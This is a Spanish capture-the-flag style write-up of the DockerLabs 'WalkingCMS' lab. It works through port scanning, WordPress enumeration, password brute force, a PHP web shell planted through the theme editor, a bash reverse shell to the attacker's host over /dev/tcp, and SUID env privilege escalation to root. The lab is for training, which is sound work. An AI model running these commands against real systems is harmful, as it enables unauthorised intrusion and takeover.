# [WalkingCMS](https://dockerlabs.es/)

## Despliegue

Primero desplegamos la máquina con ```bash auto_deploy.sh walkingcms.tar``` (si no sabes en la página de DockerLabs ahí un pdf que lo explica).

## Reconocimiento

Una vez desplegada comprobamos que tenemos conectividad con ```ping -c 1 172.17.0.2``` 
<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/af4d0189-b640-4576-aca6-3c02c75c9434)
<br>

`-c 1` ⮞ solo lo repite una vez

<br>

Ahora vamos con el reconocimiento de nmap ```nmap -p- --open --min-rate 5000 -sS -vvv -n -Pn 172.17.0.2 -oG allPorts``` <br>
`-p-` ⮞ aplicar reconocimiento a todos los puertos <br>
`--open` ⮞ solo a los que estén abiertos <br>
`--min-rate 5000` ⮞ para enviar paquetes más rápido <br> 
`-sS` ⮞ para descubrir puertos de manera silenciosa y rápida <br> 
`-vvv` ⮞ conforme descubre un puerto nos lo muestra por pantalla <br> 
`-n` ⮞ no aplica la resolución DNS (tarda mucho en el caso de que no pongamos dicho parámetro)<br> 
`-Pn` ⮞ ignora si esta activa o no la IP<br> 
`-oG` ⮞ exportamos el resultado en formato grepeable (para extraer mejor los datos con herramientas como grep, awk)

<br>

Podemos ver los resultados en el archivo grepeable haciendo ```cat allPorts```, observamos que tan solo está abierto el puerto **80**.
<br>

![alt text](image.png)

<br>
<br>

## Página Web (Puerto 80)

Al ver que está abierto el puerto 80 nos dirigimos al Navegador Web e introducimos la dirección IP como. podemos ver una página por defecto de Apache2, por lo que haremos un fuzzing para encontrar posible directorios de la siguiente forma: `gobuster dir -w /home/kali/WordLists/directory-medium -u http://172.17.0.2/wordpress -x txt,sql,py,js,php,html`
<br>

![alt text](image-1.png)

<br>

Nos reporta que existe un directorio dentro de la web llamado wordpress, por lo que entendemos que dicho servidor web está alojado en wordpress.
<br>

Una vez que sabemos que tiene un wordpress, pasaremos a usar la herramienta wp-scan la cual nos permite identificar posible vulnerabilidades a través de plugins, enumeración de usuarios y hacer un ataque de fuerza bruta al panel de login. Para usar dicha herramienta pondremos los siguiente: `wpscan --url http://172.17.0.2/wordpress --enumerate u, pv`, con la cual obtendremos que existe un usuario llamado `mario`:
<br>

![alt text](image-2.png)

<br>
<br>

## Hydra / Medusa
Una vez conocemos el posible usuario haremos un ataque de fuerza bruta al panel de login que sería `/wp-admin`. Dicho ataque de fuerza bruta se podría hacer con burpsuite pero en este caso yo usaré wpscan ya que va más rápido, por lo que pondremos lo siguiente: `wpscan --url http://172.17.0.2/wordpress --passwords /usr/share/wordlists/rockyou.txt --usernames mario`. <br> 
`-url` ⮞ dirección IP de la máquina victima <br>
`-passwords` ⮞ especificamos la ruta del diccionario en este caso sería el [rockyou](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt). <br> 
`-usernames` ⮞ especificamos los usuarios en este caso solo es `mario`.
<br>

Nos reporta lo siguiente: 
<br>

![alt text](image-3.png)

<br>

Ahora volvemos al panel de login que estaría en la siguiente ruta: `http://172.17.0.2/wordpress/wp-admin/`, nos logeamos con las credenciales obtenidas `(mario:love)`. Buscando por el panel de admin una posible forma de acceder a la máquina WalkingCMS observamos que si pinchamos en la parte de `Apariencia > Theme Code Editor` se nos abrirá un edit de código para los temas.
<br>

![alt text](image-4.png)

<br>

Pinchando en el botón de `Create` de la derecha nos aparecerá el siguiente pop-up para crear u archivo/carpeta, creamos un archivo llamado `cmd.php`.

<br>

![alt text](image-5.png)

<br>

Dicho archivo `.php` tendrá el siguiente contenido: 
<br>

![alt text](image-6.png)

<br>

Lo que debemos hacer ahora es acceder a dicho archivo a través de la URL, para ello nos iremos a la ruta que nos salía al crear un archivo, que sería `wordpress/wp-content/themes/twentytwentytwo/`:
<br>

![alt text](image-7.png)

<br>

Y lo que queremos es acceder al archivo de nombre `cmd.php` introduciremos en la URL lo siguiente: `http://172.17.0.2/wordpress/wp-content/themes/twentytwentytwo/cmd.php`, y listo conseguiremos RCE (Remove Code Execution) pasándole como parámetro el comando que queremos ejecutar en este caso `id`:
<br>

![alt text](image-8.png)

<br>

Por lo que ahora nos mandaríamos una [revshell](https://www.revshells.com/), nos ponemos en escucha en un puerto poniendo en la terminal escribiendo lo siguiente `nc -nlvp 443`, y poniendo lo siguiente en el buscador `172.17.0.2/wordpress/wp-content/themes/twentytwentytwo/cmd.php?cmd=bash -c'bash -i >%26 /dev/tcp/172.17.0.1/443 0>%261'`, y listo recibiríamos la revshell: 
<br>

![alt text](image-9.png)


## Escala de Privilegios
Antes de empezar a probar como escalar privilegios haremos un sencillo tratamiento de la tty poniendo en orden lo siguiente: <br>
1-.`script /dev/null -c bash` <br>
2-.`Pulsamos CTRL+Z` <br>
3-.`stty raw -echo; fg` <br>
4-.`reset xterm` <br>
5-.`export SHELL=bash && export TERM=xterm` <br>
6-. `ajustamos el stty size poniendo lo siguiente stty rows 49 cols 210`<br>

Comprobamos que hemos podido ingresar a la Máquina Víctima como **www-data**, hacemos un `cat /etc/passwd | grep "sh$"` para ver los posibles usuarios: 
<br>

![alt text](image-10.png)

<br>

Vemos que tan solo se encuentra el usuario `root`, por lo que entendemos que vamos a escalar privilegios directamente.
<br>

Si ejecutamos `sudo -l` observamos que no podemos correr nada como sudo, de hecho no esta ni instalado.<br>
`-l` ⮞ listar comandos que podemos ejecutar como sudo(sudoers).
<br>

![alt text](image-11.png)

<br>

Hacemos la siguiente comprobación para ver la posible escalada ejecutando `find / -perm -4000 2>/dev/null`<br>
`/` ⮞ buscamos desde la raíz <br>
`-perm -4000` ⮞ mostrar los permisos SUID <br>
`2>/dev/null` ⮞ para que no nos muestre los errores <br>

<br>

Y vemos que tenemos permiso SUID sobre `/usr/bin/env`: 
<br>

![alt text](image-12.png)

<br>

Por lo que deberíamos hacer ahora es dirigirnos a la página [GTFOBins](https://gtfobins.github.io/) (está página nos indica como elevar privilegios dependiendo del binario que podamos ejecutar), después nos vamos a la parte de SUID de env, y nos encontramos con lo siguiente:
<br>

![alt text](image-13.png)

<br>

Por lo que probaremos a ejecutarlo en la máquina víctima poniendo `/usr/bin/env /bin/bash -p`

<br>

Comprobamos que nos ha cambiado el terminal, y listo si ya somos `root` y si hacemos `whoami` para comprobarlo.
<br>

![alt text](image-14.png)